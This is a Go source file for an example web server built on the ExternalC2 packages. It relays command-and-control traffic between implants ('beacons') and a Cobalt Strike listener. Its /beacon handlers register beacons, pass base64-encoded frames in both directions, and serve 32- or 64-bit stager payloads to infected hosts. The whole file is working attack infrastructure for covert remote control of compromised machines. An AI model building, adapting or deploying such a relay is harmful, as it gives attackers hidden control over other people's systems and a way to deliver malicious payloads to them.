/*Example Web-API to demonstrate the capabilites of the Go/.NET ExternC2 packages*/
package main

import (
	"encoding/base64"
	"errors"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"strings"
	"sync"

	"github.com/gorilla/mux"
	"github.com/ryhanson/ExternalC2/go-external-c2"
	"github.com/ryhanson/ExternalC2/go-external-c2/channels"
)

var idHeader = "X-C2-Beacon"

// App holds contextual information about the running app.
type App struct {
	CSAddr  string
	Manager sync.Map
}

func (app *App) getBeacon(r *http.Request) (string, *channels.SocketChannel, error) {
	header := r.Header.Get(idHeader)
	socket, ok := app.Manager.Load(header)
	if !ok {
		return "", nil, errors.New("beacon not found")
	}
	return header, socket.(*channels.SocketChannel), nil
}

// Options grabs web channel options and creates a new channel for a beacon.
func (app *App) Options(w http.ResponseWriter, r *http.Request) {
	log.Println("[+] OPTIONS: Creating new beacon")
	socket, err := channels.NewSocket(app.CSAddr)
	if err != nil {
		log.Printf("[!] Error while trying to create the Socket: %s\n", err.Error())
		return
	}
	socket.Debug = true
	if err := socket.Connect(); err != nil {
		log.Printf("[!] Error while trying to connect to the CS server: %s\n", err.Error())
		return
	}
	beaconID, err := externc2.NewBeaconID()
	if err != nil {
		log.Printf("[!] Error while tring to generate the beacon id: %s\n", err.Error())
		return
	}
	app.Manager.Store(beaconID.InternalID, socket)
	log.Printf("[+] ID will be set to %s\n", beaconID.InternalID)
	w.Header().Add("X-Id-Header", idHeader)
	w.Header().Add("X-Identifier", beaconID.InternalID)
}

// Get salls the socket channel's ReadFrame method.
func (app *App) Get(w http.ResponseWriter, r *http.Request) {
	id, s, err := app.getBeacon(r)
	if err != nil {
		log.Printf("[!] Error during getBeacon: %s\n", err.Error())
		return
	}
	log.Printf("[+] GET: Frame to beacon id: %s\n", id)
	buff, _, err := s.ReadFrame()
	if err != nil {
		log.Printf("[!] Error during ReadFrame: %s\n", err.Error())
		return
	}
	if s.IsConnected() {
		encoder := base64.NewEncoder(base64.StdEncoding, w)
		encoder.Write(buff)
		encoder.Close()
	} else {
		fmt.Printf("[!] Socket is no longer connected")
		w.Write([]byte(""))
	}
}

// Put calls the socket channel's SendFrame method.
func (app *App) Put(w http.ResponseWriter, r *http.Request) {
	decoder := base64.NewDecoder(base64.StdEncoding, r.Body)
	id, s, err := app.getBeacon(r)
	if err != nil {
		log.Printf("[!] Error during getBeacon: %s\n", err.Error())
		return
	}
	log.Printf("[+] PUT: Frame from beacon id: %s\n", id)
	buff, err := ioutil.ReadAll(decoder)
	if err != nil {
		log.Printf("[!] Error decoding base64 payload: %s\n", err.Error())
		return
	}
	if _, err := s.SendFrame(buff); err != nil {
		log.Printf("[!] Error sending frame: %s\n", err.Error())
		return
	}
}

// Post calls the socket channel's GetStager method.
func (app *App) Post(w http.ResponseWriter, r *http.Request) {
	is64Bit := strings.Contains(r.UserAgent(), "x64")
	id, s, err := app.getBeacon(r)
	if err != nil {
		log.Printf("[!] Error during getBeacon: %s\n", err.Error())
		return
	}
	log.Printf("[+] POST: Request for stager from beacon id: %s\n", id)

	stager, err := s.GetStager(id, is64Bit, 100)
	if err != nil {
		log.Printf("[!] Error during GetStager: %s\n", err.Error())
		return
	}
	encoder := base64.NewEncoder(base64.StdEncoding, w)
	encoder.Write(stager)
	encoder.Close()
}

func main() {
	listenAddr := flag.String("listen-addr", ":8888", "ip:port for the web server to listen on")
	csAddr := flag.String("cs-addr", "", "ip:port of the cs listener")
	flag.Parse()
	if *csAddr == "" {
		log.Fatal("You must provide a valid value for csAddr. Example: 127.0.0.1:2222.")
	}
	r := mux.NewRouter()
	app := &App{
		CSAddr: *csAddr,
	}
	r.HandleFunc("/beacon", app.Options).Methods("OPTIONS")
	r.HandleFunc("/beacon", app.Get).Methods("GET")
	r.HandleFunc("/beacon", app.Put).Methods("PUT")
	r.HandleFunc("/beacon", app.Post).Methods("POST")
	http.Handle("/", r)
	log.Fatal(http.ListenAndServe(*listenAddr, nil))
}
